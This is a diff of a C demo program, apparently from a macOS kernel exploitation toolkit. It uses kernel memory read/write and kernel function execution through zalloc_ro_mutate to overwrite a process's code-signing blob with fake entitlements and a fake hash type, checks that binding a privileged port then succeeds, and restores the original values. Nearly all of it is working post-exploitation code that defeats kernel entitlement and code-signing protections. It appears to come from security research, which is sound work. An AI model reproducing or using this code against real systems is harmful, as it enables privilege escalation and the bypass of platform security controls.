@@ -38,7 +38,7 @@
 
 
 void print_usage(void) {
-    xe_log_info("usage: demo_entitlements <path-to-kmem> <path-to-entitlement-plist> <cmd> [arg1] [arg2] ...");
+    xe_log_info("usage: demo_entitlements <path-to-kmem>");
 }
 
 
@@ -82,24 +82,27 @@ uintptr_t get_proc_cs_blobs(uintptr_t proc) {
 }
 
 
-void ml_nofault_copy(xe_util_kfunc_t kfunc, uintptr_t dst, void* src, uint32_t size) {
+void mutate_csblob_entilements_der(xe_util_kfunc_t kfunc, uintptr_t cs_blob, uintptr_t new_der, uintptr_t new_hash_type) {
     uintptr_t temp_buffer;
-    xe_allocator_small_mem_t allocator = xe_allocator_small_mem_allocate(size, &temp_buffer);
-    xe_kmem_write(temp_buffer, 0, src, size);
+    xe_allocator_small_mem_t allocator = xe_allocator_small_mem_allocate(TYPE_CS_BLOB_SIZE, &temp_buffer);
+    xe_kmem_copy(temp_buffer, cs_blob, TYPE_CS_BLOB_SIZE);
+    xe_kmem_write_uint64(temp_buffer, TYPE_CS_BLOB_MEM_CSB_DER_ENTITLEMENTS_BLOB_OFFSET, new_der);
+    xe_kmem_write_uint64(temp_buffer, TYPE_CS_BLOB_MEM_CSB_HASHTYPE_OFFSET, new_hash_type);
     
     uint64_t args[8];
-    bzero(args, sizeof(args));
-    args[0] = temp_buffer;
-    args[1] = dst;
-    args[2] = size;
-    xe_util_kfunc_exec(kfunc, xe_slider_kernel_slide(FUNC_ML_NOFAULT_COPY_ADDR), args);
+    args[0] = 8;
+    args[1] = cs_blob;
+    args[2] = 0;
+    args[3] = temp_buffer;
+    args[4] = TYPE_CS_BLOB_SIZE;
+    xe_util_kfunc_exec(kfunc, xe_slider_kernel_slide(FUNC_ZALLOC_RO_MUTATE_ADDR), args);
     
     xe_allocator_small_mem_destroy(&allocator);
 }
 
 
 int main(int argc, const char * argv[]) {
-    if (argc < 2) {
+    if (argc != 2) {
         xe_log_error("invalid arguments");
         print_usage();
         exit(1);
@@ -121,7 +124,7 @@ int main(int argc, const char * argv[]) {
     
     int res = bind(fd, (struct sockaddr*)&addr, sizeof(addr));
     if (res) {
-        xe_log_info("bind failed as expected, err: %s", strerror(errno));
+        xe_log_info("bind to privileged port 55555 failed as expected, err: %s", strerror(errno));
     } else {
         xe_log_error("bind succeeded without entitlement");
         exit(1);
@@ -164,24 +167,21 @@ int main(int argc, const char * argv[]) {
     xe_util_kfunc_t kfunc = xe_util_kfunc_create(VAR_ZONE_ARRAY_LEN - 1);
     
     xe_log_info("setting fake entitlements and hashtype");
-    // FIXME: ml_nofault_copy randomly freezes when copying full cs_blob
-    ml_nofault_copy(kfunc, cs_blob + TYPE_CS_BLOB_MEM_CSB_HASHTYPE_OFFSET, &fake_csb_hashtype, sizeof(uintptr_t));
-    ml_nofault_copy(kfunc, cs_blob + TYPE_CS_BLOB_MEM_CSB_DER_ENTITLEMENTS_BLOB_OFFSET, &fake_der_blob, sizeof(uintptr_t));
+    mutate_csblob_entilements_der(kfunc, cs_blob, fake_der_blob, fake_csb_hashtype);
     xe_log_info("fake entitlements and hashtype set");
     
     res = bind(fd, (struct sockaddr*)&addr, sizeof(addr));
     if (res) {
-        xe_log_error("bind failed after adding entitlement");
+        xe_log_error("bind failed even after adding entitlement");
         exit(1);
     } else {
-        xe_log_info("bind succeded after adding entitlement");
+        xe_log_info("bind to privileged port succeded after adding entitlement");
     }
     
     close(fd);
     
     xe_log_info("restoring entitlements and hashtype");
-    ml_nofault_copy(kfunc, cs_blob + TYPE_CS_BLOB_MEM_CSB_DER_ENTITLEMENTS_BLOB_OFFSET, &cs_der_entitlements_blob, sizeof(uintptr_t));
-    ml_nofault_copy(kfunc, cs_blob + TYPE_CS_BLOB_MEM_CSB_HASHTYPE_OFFSET, &csb_hashtype, sizeof(uintptr_t));
+    mutate_csblob_entilements_der(kfunc, cs_blob, cs_der_entitlements_blob, csb_hashtype);
     xe_log_info("restored entitlements and hashtype");
     
     xe_allocator_small_mem_destroy(&fake_der_allocator);
